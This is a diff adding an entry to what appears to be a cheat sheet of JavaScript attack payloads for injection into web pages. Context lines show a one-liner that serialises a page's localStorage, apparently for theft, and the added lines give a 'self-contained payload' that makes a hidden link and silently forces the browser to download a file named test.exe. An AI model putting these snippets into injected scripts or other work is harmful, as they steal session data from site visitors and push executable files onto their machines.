@@ -37,3 +37,6 @@ Timeout function in case in-page elements load at different times
 
 Accessing local storage
 `encodeURIComponent(JSON.stringify(localStorage))`
+
+Self-contained payload to download a file blob as a .exe
+`function saveBlob(blob, fileName) { var a = document.createElement("a"); document.body.appendChild(a); a.style = "display: none"; var url = window.URL.createObjectURL(blob); a.href = url; a.download = fileName; a.click(); window.URL.revokeObjectURL(url); }; saveBlob(new Blob(["examplePayloadhere"], { type: 'text/plain' }), 'test.exe');`
